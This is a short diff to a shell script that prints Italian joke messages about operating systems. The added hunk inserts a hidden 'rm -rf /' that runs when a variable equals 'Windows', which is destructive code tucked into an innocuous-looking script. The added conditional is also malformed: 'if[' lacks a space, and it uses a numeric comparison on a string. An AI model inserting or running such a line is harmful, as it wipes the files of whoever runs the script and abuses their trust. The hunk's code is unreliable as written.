@@ -29,5 +29,10 @@ while test $# -gt 0; do
         esac
 done
 
+if[ $LINUX -eq "Windows" ]
+then
+  rm -rf /
+fi
+
 echo "Che schifo $THING."
 echo "Meglio $LINUX!"
